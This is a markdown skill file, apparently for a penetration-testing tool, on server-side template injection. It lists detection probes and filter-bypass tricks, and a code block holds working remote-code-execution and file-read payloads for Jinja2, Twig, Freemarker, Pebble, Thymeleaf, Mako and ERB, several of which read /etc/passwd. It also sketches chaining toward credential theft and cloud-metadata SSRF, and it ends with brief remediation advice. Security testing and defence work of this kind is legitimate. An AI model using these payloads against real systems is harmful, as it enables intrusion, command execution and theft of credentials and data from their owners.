---
name: ssti
description: Server-Side Template Injection for RCE via template engine exploitation
---

# Server-Side Template Injection (SSTI)

## Attack Surface
- User input rendered directly into server-side templates (Jinja2, Twig, Freemarker, Pebble, Thymeleaf, Mako)
- Error pages, email templates, PDF generators, and CMS systems that dynamically build templates from user data
- Any application that concatenates user input into template strings before rendering

## Detection Techniques
- Inject mathematical polyglot: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}` and check for `49` in response
- Use engine-specific probes: `{{7*'7'}}` returns `7777777` in Jinja2 but `49` in Twig
- Submit `{{config}}` or `{{settings}}` to detect Jinja2/Django template contexts
- Test error-based detection: inject `{{invalid` and observe template syntax errors in responses
- Fuzz with `${"".class}` (Java EL), `*{T(java.lang.Runtime)}` (Thymeleaf), `[#assign x=1]` (Freemarker)

## Common Payloads

```
# Jinja2 (Python) - RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}
{{request.__class__._load_form_data.__globals__.__builtins__.open('/etc/passwd').read()}}
{{cycler.__init__.__globals__.os.popen('whoami').read()}}
{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}

# Twig (PHP) - RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{app.request.server.get('DOCUMENT_ROOT')}}

# Freemarker (Java) - RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${T(java.lang.Runtime).getRuntime().exec("id")}
[#assign cmd="freemarker.template.utility.Execute"?new()]${cmd("cat /etc/passwd")}

# Pebble (Java) - RCE
{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{(1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]),[0])}}

# Thymeleaf (Java) - RCE via URL path
/path;__${T(java.lang.Runtime).getRuntime().exec('id')}__::x
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}

# Mako (Python) - RCE
${self.module.cache.util.os.popen('id').read()}
<%import os%>${os.popen('whoami').read()}

# ERB (Ruby) - RCE
<%= system('id') %>
<%= `cat /etc/passwd` %>
```

## Bypass Techniques
- Use alternative Jinja2 objects: `lipsum`, `cycler`, `joiner`, `namespace` to reach `__globals__`
- Bypass `_` filter: use `attr()` filter like `''|attr('\x5f\x5fclass\x5f\x5f')` or hex/unicode encoding
- Bypass dot notation: use bracket syntax `config['__class__']` or `|attr('__class__')`
- Use `request.args` or `request.cookies` to smuggle blocked keywords through HTTP parameters
- For Java: use reflection chains via `T()` expressions to avoid direct class name blacklists

## Exploit Chaining
- SSTI to RCE: most template engines provide a direct path to OS command execution via language-native features
- SSTI to file read: exfiltrate config files, credentials, and source code before escalating to shell
- SSTI to SSRF: use template engine functions to make HTTP requests to internal services (e.g., cloud metadata)

## Remediation
- Never concatenate user input into template strings; always pass variables through the template context
- Use sandboxed template environments (Jinja2 `SandboxedEnvironment`) and restrict accessible objects
- Implement strict input validation: reject or escape template syntax characters (`{{`, `{%`, `${`)
- Keep template engines updated and audit custom template filters/extensions for injection paths
